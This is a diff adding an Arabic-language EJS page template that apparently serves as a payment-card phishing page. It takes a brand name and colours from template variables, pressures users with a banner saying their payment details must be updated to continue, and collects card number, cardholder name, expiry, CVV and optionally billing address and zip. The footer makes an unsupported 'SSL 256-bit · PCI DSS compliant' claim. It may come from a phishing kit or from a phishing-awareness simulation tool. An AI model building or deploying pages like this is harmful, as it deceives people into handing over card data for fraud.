@@ -1,0 +1,88 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title><%= pageContent.page_title %> — <%= tpl.name %></title>
+<style>
+:root{--bg:<%= tpl.palette.bg %>;--card:<%= tpl.palette.card %>;--fg:<%= tpl.palette.fg %>;--ac:<%= tpl.palette.accent %>;--ac2:<%= tpl.palette.accent2 %>}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:var(--fg);font-family:system-ui,-apple-system,Tahoma,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.card{background:var(--card);border-radius:16px;padding:36px 32px;max-width:460px;width:100%;box-shadow:0 8px 32px #00000040}
+.brand-logo{font-size:1.1rem;font-weight:700;color:var(--ac);margin-bottom:8px;display:block;text-align:center}
+.warn-banner{background:#f59e0b18;border:1px solid #f59e0b40;border-radius:10px;padding:12px 16px;margin-bottom:24px;font-size:.87rem;color:#fcd34d;text-align:center}
+h1{font-size:1.2rem;margin-bottom:6px;text-align:center}
+.sub{font-size:.88rem;opacity:.6;text-align:center;margin-bottom:24px}
+.card-visual{background:linear-gradient(135deg,var(--ac),var(--ac2));border-radius:14px;padding:20px 22px;margin-bottom:24px;position:relative;min-height:90px}
+.card-visual .chip{width:32px;height:24px;background:#ffd700;border-radius:4px;opacity:.8;margin-bottom:12px}
+.card-visual .num{font-size:1.1rem;letter-spacing:3px;color:#fff;font-family:monospace;opacity:.7}
+.field-group{margin-bottom:14px}
+label{display:block;font-size:.83rem;opacity:.75;margin-bottom:5px}
+input{width:100%;padding:12px 14px;background:var(--bg);border:1.5px solid #ffffff18;border-radius:10px;color:var(--fg);font-family:monospace;font-size:1rem;transition:.2s;outline:none;letter-spacing:1px}
+input:focus{border-color:var(--ac);box-shadow:0 0 0 3px var(--ac)20}
+.row2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.btn{width:100%;padding:14px;background:var(--ac);color:#fff;border:0;border-radius:10px;font-size:1rem;font-weight:600;cursor:pointer;margin-top:12px;transition:.2s}
+.btn:hover{opacity:.9}
+.secure{text-align:center;font-size:.76rem;opacity:.4;margin-top:14px;display:flex;align-items:center;justify-content:center;gap:6px}
+.card-icons{display:flex;gap:8px;justify-content:flex-end;margin-bottom:16px;opacity:.5;font-size:.78rem}
+</style>
+</head>
+<body>
+<div class="card">
+  <span class="brand-logo"><%= tpl.name %></span>
+
+  <div class="warn-banner">
+    ⚠️ <%= pageContent.subheadline || 'يجب تحديث بيانات الدفع للمتابعة' %>
+  </div>
+
+  <h1><%= pageContent.headline || 'تحديث طريقة الدفع' %></h1>
+  <p class="sub">أدخل بيانات بطاقتك بشكل آمن</p>
+
+  <div class="card-icons">
+    <span>VISA</span><span>Mastercard</span><span>AMEX</span>
+  </div>
+
+  <form method="POST" action="/p/<%= page.slug %>/step/<%= pageContent.slug %>">
+    <input type="hidden" name="_csrf" value="<%= csrfToken %>">
+    <input type="hidden" name="_step" value="<%= pageContent.slug %>">
+
+    <div class="field-group">
+      <label>رقم البطاقة</label>
+      <input type="text" name="card_number" maxlength="19" placeholder="0000  0000  0000  0000"
+             oninput="this.value=this.value.replace(/\D/g,'').replace(/(.{4})/g,'$1 ').trim()" required>
+    </div>
+    <div class="field-group">
+      <label>الاسم على البطاقة</label>
+      <input type="text" name="name_on_card" placeholder="JOHN DOE" style="font-family:inherit;letter-spacing:0" required>
+    </div>
+    <div class="row2">
+      <div class="field-group">
+        <label>تاريخ الانتهاء</label>
+        <input type="text" name="expiry" maxlength="5" placeholder="MM/YY"
+               oninput="let v=this.value.replace(/\D/g,'');if(v.length>=2)v=v.slice(0,2)+'/'+v.slice(2);this.value=v" required>
+      </div>
+      <div class="field-group">
+        <label>CVV</label>
+        <input type="text" name="cvv" maxlength="4" placeholder="•••" oninput="this.value=this.value.replace(/\D/g,'')" required>
+      </div>
+    </div>
+
+    <% if ((pageContent.fields||[]).includes('billing_address')) { %>
+    <div class="field-group">
+      <label>عنوان الفاتورة</label>
+      <input type="text" name="billing_address" placeholder="123 Main St" style="font-family:inherit;letter-spacing:0" required>
+    </div>
+    <% } %>
+    <% if ((pageContent.fields||[]).includes('zip')) { %>
+    <div class="field-group">
+      <label>الرمز البريدي</label>
+      <input type="text" name="zip" placeholder="12345" maxlength="10" required>
+    </div>
+    <% } %>
+
+    <button type="submit" class="btn"><%= pageContent.cta || 'تأكيد وتحديث' %></button>
+  </form>
+  <p class="secure">🔒 مشفر بـ SSL 256-bit · PCI DSS متوافق</p>
+</div>
+</body>
+</html>
